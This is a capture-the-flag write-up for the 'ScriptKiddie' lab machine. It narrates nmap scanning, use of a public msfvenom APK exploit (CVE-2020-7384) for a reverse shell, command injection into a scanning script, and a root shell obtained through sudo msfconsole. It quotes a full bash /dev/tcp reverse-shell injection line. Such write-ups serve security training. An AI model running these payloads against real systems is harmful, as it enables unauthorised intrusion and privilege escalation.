ScriptKiddie

Target IP: 10.129.95.150
Challenge Description: N/A.

Reconnaissance


Performing a port scan using the command sudo nmap -sS 10.129.95.150 -p- returns the result above. According to the scan, there are two TCP ports open on the target machine: SSH on port 22, and some other application on port 5000. I will start enumeration with the application on the higher port first.


Running an aggressive port scan against the two TCP ports using the command sudo nmap -sV -A 10.129.95.150 -p 22,5000 returns the result above. By the looks of it, the higher port application is running HTTP. I will start enumeration here.

Enumeration

Port 5000: HTTP

The webpage above is returned for this port. It seems to be tools created for hackers. I performed a directory search but I did not find anything useful. I also tested the nmap feature for command injection, but I had no luck either. I notice this web application allows me to upload some sort of template file via msfvenom.


Doing a Google search for msfvenom template cve returned the interesting result above. Time to find out more information about this vulnerability.


And bingo! If the web application is using msfvenom with a vulnerability, it is possible to upload a file to perform RCE on the target machine according to the CVE detail shown above. I do not know what version the target machine is running, but this exploit might be worth trying.


Searching for a public exploit for CVE-2020-7384, I found the exploit shown above. I downloaded the exploit on my machine with the filename exp.sh.


Then I executed the exploit and used the default values to generate a payload to run on the target machine. Time to upload this malicious APK file.

Exploitation


I started a listener on my machine at port 4444. Then I browsed to the web application made the following changes: changed os to android, lhost to 127.0.0.1, and uploaded the malicious APK file generated by the public exploit. After uploading it successfully, I immediately obtained a reverse shell connection with the session as the user kid, as shown above. Now I have a foothold on the target machine.

Privilege Escalation


Browsing to /home there are two users: kid and pwn, as shown above.


Inside the home directory of user pwn, there is an interesting shell script by the name scanlosers.sh. The content of this script is shown above. This script seems to perform a port scan against the IPs pulled from a file. But is this script run automatically? I transferred pspy64 to the target machine and executed it, but this script is not being run automatically.


Upon further inspection of the scanlosers.sh, I notice it does not perform any input checks. Therefore, it is vulnerable to command injection attacks.


I started a listener on my machine at port 8444. Since the shell script is vulnerable to command injection, I inserted the reverse shell using the command echo " ;/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.33/8444 0>&1' #" >> hackers inside the hackers file located at /home/kid/logs/. Then immediately, I obtained a reverse shell connection with the session as pwn, as shown above.


Running the command sudo -l shows the binary msfconsole can be executed as the user root. I ran the command sudo /opt/metasploit-framework-6.0.9/msfconsole.


After msfconsole started, I executed the command irb and then system("/bin/sh") to open a root shell. And bingo. Now I have a root shell on the target machine :)
